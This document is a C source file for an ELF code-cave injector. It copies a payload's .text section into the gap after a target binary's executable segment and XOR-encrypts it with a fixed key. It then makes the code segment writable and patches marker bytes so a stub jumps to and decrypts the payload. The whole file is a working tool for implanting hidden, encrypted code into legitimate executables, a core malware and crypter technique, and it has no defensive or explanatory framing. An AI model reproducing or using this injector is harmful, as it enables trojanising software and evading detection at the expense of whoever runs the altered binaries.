#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <elf.h>
#include <sys/mman.h>

#define KEY "\x31\x41\x59"


void encrypt (uint8_t* payload, uint8_t* key, int payload_size, int key_size) {
  for (int i = 0; i < payload_size; i++) {
    if (*(key + (i % key_size)) != 0)
      *(payload + i) ^= *(key + (i % key_size));
  }
}

int open_map_elf(char* filename, uint8_t** data) {
  int fd, size;

  if ((fd = open(filename, O_RDWR)) < 0) {
    perror("Opening file");
    exit(1);
  }

  size = lseek(fd, 0, SEEK_END);

  *data = mmap(0, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

  return fd;
}

Elf64_Shdr* find_elf64_sections (uint8_t* data, char* name) {
  Elf64_Ehdr *ehdr = (Elf64_Ehdr*)data;
  Elf64_Shdr *shdr = (Elf64_Shdr*)(data + ehdr->e_shoff);
  
  char* sname;
  const char* sh_strtab_p = data + shdr[ehdr->e_shstrndx].sh_offset;
  int section_idx;
  for (int i = 0; i < ehdr->e_shnum; i++) {
    sname = (char*)(sh_strtab_p + shdr[i].sh_name);
    if (!strcmp(name, sname)) {
      return &shdr[i];
    }
  }
  perror("Cannot find elf section");
  exit(1);
}

int find_code_segment (uint8_t* data) {
  Elf64_Ehdr *ehdr = (Elf64_Ehdr*)data;
  Elf64_Phdr *phdr = (Elf64_Phdr*)(data + ehdr->e_phoff);
  
  int text_idx;
  for (int i = 0; i < ehdr->e_phnum; i++) {
    if ((phdr[i].p_flags & 5) == 5 && phdr[i].p_type == PT_LOAD) {
      return i;
    }
  }
  perror("Cannot find code segment");
  exit(1);
}

int main(int argc, char* argv[]) {
  int target_fd, payload_fd;
  uint8_t *target_data, *payload_data;

  if (argc != 3) {
    printf("Usage: %s <src> <payload>\n", argv[0]);
    return 0;
  }

  target_fd = open_map_elf(argv[1], &target_data);
  payload_fd = open_map_elf(argv[2], &payload_data);

  // Find code cave for target binary.
  Elf64_Ehdr* ehdr = (Elf64_Ehdr*)target_data;
  Elf64_Shdr* shdr = (Elf64_Shdr*)(target_data + ehdr->e_shoff);
  Elf64_Phdr *phdr = (Elf64_Phdr*)(target_data + ehdr->e_phoff);

  int code_idx = find_code_segment(target_data);
  int code_end_offset = phdr[code_idx].p_offset + phdr[code_idx].p_filesz;
  int gap_size = phdr[code_idx + 1].p_offset - code_end_offset;
  uint8_t* code_cave = target_data + code_end_offset;

  // Allow code to be self-modifying.
  phdr[code_idx].p_flags |= 2;

  // Locate relevant code in payload binary.
  int payload_size;
  uint8_t* payload_code;
  Elf64_Shdr* payload_text_shdr = find_elf64_sections(payload_data, ".text");
  payload_size = payload_text_shdr->sh_size;
  if (payload_size > gap_size) {
    perror("Payload won't fit");
    exit(1);
  }

  payload_code = payload_data + payload_text_shdr->sh_offset;

  // Copy payload to code cave.
  memmove(code_cave, payload_code, payload_size);
  char* key = KEY;
  encrypt(code_cave, key, payload_size, strlen(KEY));

  uint8_t* ptr = target_data;
  while (*ptr != 0xcc || *(ptr + 1) != 0xcc) {
    ptr += 1;
  }
  *ptr = 0x90;
  *(ptr + 1) = 0x90;
  short int jmp_offset = code_cave - ptr;
  while (*ptr != 0x11 || *(ptr + 1) != 0x11) {
    ptr += 1;
  }
  *ptr = jmp_offset % 256;
  *(ptr + 1) = jmp_offset >> 8;
  while (*ptr != 0x22 || *(ptr + 1) != 0x22) {
    ptr += 1;
  }
  *ptr = payload_size % 256;
  *(ptr + 1) = payload_size >> 8;

  close(target_fd);
  close(payload_fd);

  return 0;
}
